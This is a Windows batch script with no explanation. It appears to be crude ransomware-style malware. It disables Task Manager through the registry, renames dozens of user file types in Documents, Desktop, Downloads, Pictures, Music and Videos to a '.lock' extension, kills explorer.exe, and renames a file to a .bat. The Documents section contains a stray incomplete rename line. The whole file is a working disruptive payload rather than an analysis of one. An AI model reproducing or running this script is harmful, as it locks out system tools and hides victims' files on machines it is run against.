@echo off
color 0A
echo initialzing Framework

reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
cd %appdata%
cd ..
cd ..
cd Documents
ren *.htm *.lock
ren *.html *.lock
ren *.pdf *.lock
ren *.xls *.lock
ren *.xlsx *.lock
ren *.ods *.lock
ren *.ppt *.lock
ren *.pptx *.lock
ren *.key *.lock
ren *.bmp *.lock
ren *.jpeg *.lock
ren *.jpg *.lock
ren *.png *.lock
ren *.py *.lock
ren *.java *.lock
ren *.js *.lock
ren *.zip *.lock
ren *.rar *.lock
ren *.exe *.lock
ren *.app *.lock
ren *.bin *.lock
ren *.mp3 *.lock
ren *.wav *.lock
ren *.mp4 *.lock
ren *.drw *.lock
ren *.dwg *.lock
ren *
cd ..
cd Desktop
ren *.htm *.lock
ren *.html *.lock
ren *.pdf *.lock
ren *.xls *.lock
ren *.xlsx *.lock
ren *.ods *.lock
ren *.ppt *.lock
ren *.pptx *.lock
ren *.key *.lock
ren *.bmp *.lock
ren *.jpeg *.lock
ren *.jpg *.lock
ren *.png *.lock
ren *.py *.lock
ren *.java *.lock
ren *.js *.lock
ren *.zip *.lock
ren *.rar *.lock
ren *.exe *.lock
ren *.app *.lock
ren *.bin *.lock
ren *.mp3 *.lock
ren *.wav *.lock
ren *.mp4 *.lock
ren *.drw *.lock
ren *.dwg *.lock
cd ..
cd Downloads
ren *.htm *.lock
ren *.html *.lock
ren *.pdf *.lock
ren *.xls *.lock
ren *.xlsx *.lock
ren *.ods *.lock
ren *.ppt *.lock
ren *.pptx *.lock
ren *.key *.lock
ren *.bmp *.lock
ren *.jpeg *.lock
ren *.jpg *.lock
ren *.png *.lock
ren *.py *.lock
ren *.java *.lock
ren *.js *.lock
ren *.zip *.lock
ren *.rar *.lock
ren *.exe *.lock
ren *.app *.lock
ren *.bin *.lock
ren *.mp3 *.lock
ren *.wav *.lock
ren *.mp4 *.lock
ren *.drw *.lock
ren *.dwg *.lock
cd ..
cd Pictures
ren *.htm *.lock
ren *.html *.lock
ren *.pdf *.lock
ren *.xls *.lock
ren *.xlsx *.lock
ren *.ods *.lock
ren *.ppt *.lock
ren *.pptx *.lock
ren *.key *.lock
ren *.bmp *.lock
ren *.jpeg *.lock
ren *.jpg *.lock
ren *.png *.lock
ren *.py *.lock
ren *.java *.lock
ren *.js *.lock
ren *.zip *.lock
ren *.rar *.lock
ren *.exe *.lock
ren *.app *.lock
ren *.bin *.lock
ren *.mp3 *.lock
ren *.wav *.lock
ren *.mp4 *.lock
ren *.drw *.lock
ren *.dwg *.lock
cd ..
cd Music
ren *.htm *.lock
ren *.html *.lock
ren *.pdf *.lock
ren *.xls *.lock
ren *.xlsx *.lock
ren *.ods *.lock
ren *.ppt *.lock
ren *.pptx *.lock
ren *.key *.lock
ren *.bmp *.lock
ren *.jpeg *.lock
ren *.jpg *.lock
ren *.png *.lock
ren *.py *.lock
ren *.java *.lock
ren *.js *.lock
ren *.zip *.lock
ren *.rar *.lock
ren *.exe *.lock
ren *.app *.lock
ren *.bin *.lock
ren *.mp3 *.lock
ren *.wav *.lock
ren *.mp4 *.lock
ren *.drw *.lock
ren *.dwg *.lock
cd ..
cd Videos
ren *.htm *.lock
ren *.html *.lock
ren *.pdf *.lock
ren *.xls *.lock
ren *.xlsx *.lock
ren *.ods *.lock
ren *.ppt *.lock
ren *.pptx *.lock
ren *.key *.lock
ren *.bmp *.lock
ren *.jpeg *.lock
ren *.jpg *.lock
ren *.png *.lock
ren *.py *.lock
ren *.java *.lock
ren *.js *.lock
ren *.zip *.lock
ren *.rar *.lock
ren *.exe *.lock
ren *.app *.lock
ren *.bin *.lock
ren *.mp3 *.lock
ren *.wav *.lock
ren *.mp4 *.lock
ren *.drw *.lock
ren *.dwg *.lock
cd ..
taskkill /f /im explorer.exe
ren options.bin options.bat
